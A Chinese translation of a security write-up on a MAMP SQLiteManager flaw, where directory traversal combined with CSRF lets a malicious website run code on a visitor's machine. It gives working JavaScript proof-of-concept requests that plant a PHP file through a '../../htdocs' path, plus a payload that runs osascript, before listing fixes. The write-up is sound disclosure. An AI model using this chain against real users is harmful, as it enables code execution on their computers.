> 原文链接: https://www.anquanke.com//post/id/86344 


# 【技术分享】针对MAMP集成环境套件中的SQLiteManager漏洞的分析


                                阅读量   
                                **93202**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：itsec.nl
                                <br>原文地址：[https://www.itsec.nl/en/2017/06/26/drive-by-remote-code-execution-by-mamp/](https://www.itsec.nl/en/2017/06/26/drive-by-remote-code-execution-by-mamp/)

译文仅供参考，具体内容表达以及含义原文为准

 [![](https://p2.ssl.qhimg.com/t0100608e4c1322d4e9.png)](https://p2.ssl.qhimg.com/t0100608e4c1322d4e9.png)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：120RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



** 一、前言**



MAMP是一组集成环境套件，四个字母代表的是运行在Mac OS X上的Apache、MySQL以及PHP。MAMP套件中包含了SQLiteManager，这个SQLiteManager存在多个漏洞。当MAMP的用户访问一个恶意网站时，攻击者可以利用这几个漏洞来执行代码，本文对这种情况进行了分析。

<br>



**二、背景知识**



2.1 MAMP

MAMP是一个Web集成环境套件，可以安装在Mac OS X上。Web开发者通常会使用MAMP来测试他们正在研发的Web应用。MAMP会在系统上安装Apache服务，默认运行在8888端口上，同样也会包括某些数据库管理程序，比如phpMyAdmin以及SQLiteManager。

2.2 SQLiteManager

[SQLiteManager](https://sourceforge.net/projects/sqlitemanager/)是个SQLite数据库管理工具，角色上与phpMyAdmin类似。SQLiteManager可以创建新的数据库，向数据库中添加表以及发起SQL查询。自2013年起，SQLiteManager就没有再更新，已经包含了某些[已知漏洞](https://packetstormsecurity.com/files/134272/SQLiteManager-1.2.4-Cross-Site-Scripting.html)。

<br>

**三、漏洞分析**



3.1 目录遍历漏洞

SQLiteManager可以用来创建新的数据库。一个SQLite数据库包含在单个文件中，我们在创建数据库时可以指定新数据库所对应的文件名。新的数据库文件会在/Applications/MAMP/db/sqlite目录中生成。然而，我们可以在文件名后添加“../”字符串，跳转到上一层目录，将数据库存放在上一层目录中。

我们同样可以利用这个技巧，将包含PHP代码的文件存放到Web根目录下。我们可以使用诸如“../../htdocs/script.php”之类的文件名，将script.php这个文件存放到Web根目录下。然后，我们可以使用SQLiteManager，创建一个数据表，添加包含我们PHP代码的一行数据。sciprt.php是一个包含PHP代码的有效的SQLite数据库文件，当这个文件被访问时就会运行PHP代码。

[![](https://p0.ssl.qhimg.com/t011ca114792ffe9b97.png)](https://p0.ssl.qhimg.com/t011ca114792ffe9b97.png)

[![](https://p3.ssl.qhimg.com/t01d3231598b50d5a02.png)](https://p3.ssl.qhimg.com/t01d3231598b50d5a02.png)

[![](https://p5.ssl.qhimg.com/t01ffab5d6c57179612.png)](https://p5.ssl.qhimg.com/t01ffab5d6c57179612.png)

3.2 CSRF漏洞

攻击者无法直接访问运行在本地主机（localhost）上的SQLiteManager。然而，如果攻击者可以在浏览器中运行Javascript，那么他就可以“伪造”请求来实施攻击。如果用户通过安装MAMP的那台主机访问攻击者搭建的Web站点，那么攻击者可以在这台主机上利用浏览器发起请求。这些请求能够访问运行在本地主机上的SQLiteManager。这种通过受害者浏览器反弹请求的方法称之为跨站请求伪造方法（cross site request forgery），即CSRF。

SQLiteManager没有使用任何CSRF防护机制，因此3.1中提到的目录遍历漏洞也可以使用CSRF方法来触发。攻击者可以使用Javascript发起POST请求，创建数据库、往数据库中填充数据，然后再发起请求访问结果文件。这样一来，当受害者访问某个恶意网站时，攻击者就可以使用这种方法在安装了MAMP的受害者主机上运行代码。

比如，我们可以使用如下Javascript代码，发起请求，创建一个数据库：



```
let formData = new FormData();
formData.append(“dbname”, “somename”);
formData.append(“dbVersion”, 3);
formData.append(“dbpath”, “../../htdocs/script.php”);
formData.append(“action”, “saveDb”);
 
fetch(“http://localhost:8888/sqlitemanager/main.php”, `{`
   method: “POST”,
   body: formData
`}`);
```

创建数据表之后，我们可以插入一个载荷：



```
let payload = “&lt;?php `osascript -e ‘tell application (path to frontmost application as text) to display dialog ”Remote code execution on MAMP” with icon stop’`; ?&gt;”;
let formData = new FormData();
formData.append(“funcs[test]”, “”);
formData.append(“valField[test]”, payload);
formData.append(“action”, “saveElement”);
formData.append(“currentPage”, “”);
formData.append(“after_save”, “properties”);
 
return fetch(“http://localhost:8888/sqlitemanager/main.php?dbsel=1&amp;table=test”, `{`
   method: “POST”,
   body: formData
`}`).catch(e =&gt; e);
```

dbsel的值即为我们刚刚创建的数据库的编号。虽然我们事先无法知道这个具体值，但我们可以尝试0到50之间的所有数值，希望能够命中正确的值。

当我们发起请求访问这个文件时，osascript命令就会被执行，弹出如下对话框：

[![](https://p2.ssl.qhimg.com/t01e6a15f78a8377be2.png)](https://p2.ssl.qhimg.com/t01e6a15f78a8377be2.png)

<br>

**四、总结**



如果我们将CSRF以及目录遍历这两个漏洞一起使用，当受害者访问包含恶意Javascript的网站时，我们就能获得远程代码执行权限。

立竿见影解决这个问题的方法就是禁用SQLiteManager。MAMP用户可以编辑“/Applications/MAMP/conf/apache/httpd.conf”这个配置文件，禁用SQLiteManager。除非有专人接管SQLiteManager的维护工作，否则这些漏洞很可能不会被修复。现在我们已经可以使用[phpLiteAdmin](https://www.phpliteadmin.org/)来对MAMP中的SQLite进行管理。

更为宽泛的解决方案是禁止公共互联网访问私有的RFC1918 IP地址。现在已经有相关[提议](https://wicg.github.io/cors-rfc1918/)，建议在默认情况下禁用此类请求，然后再引入新的CORS头部来显式允许这种请求通过。

如果大家有更多建议，欢迎积极跟我们[联系](https://www.itsec.nl/contact/)。


